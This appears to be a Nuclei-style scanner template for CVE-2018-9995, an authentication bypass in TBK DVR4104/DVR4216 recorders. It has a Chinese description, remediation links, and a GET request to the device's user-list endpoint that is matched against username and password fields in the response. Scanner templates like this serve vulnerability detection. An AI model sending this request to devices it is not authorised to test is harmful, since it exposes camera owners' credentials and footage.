id: CVE-2018-9995
info:
  name: TBK DVR4104/DVR4216 Devices - Authentication Bypass
  author:
  - l0ne1y
  description: |-
    TBK DVR4104和DVR4216登陆绕过漏洞
    TBK DVR4104和DVR4216都是高清数字录像机设备。

    TBK DVR4104和DVR4216中存在安全漏洞。远程攻击者可借助Cookie: uid=admin包头利用该漏洞绕过身份验证。
  severity: critical
  remediation: |-
    官方修复建议：
    用户可参考如下供应商提供的安全公告获得补丁信息：
    http://misteralfa-hack.blogspot.cl/2018/04/update-dvr-login-bypass-cve-2018-
    9995.html#more

    临时修复建议：
    <br/>1、前后端同时对用户输入信息进行校验，双重验证机制。<br/>2、调用功能前验证用户是否有权限调用相关功能。
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - '"uid":'
    - '"pwd":'
    - '"view":'
    - playback
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/device.rsp?opt=user&cmd=list'
  method: GET
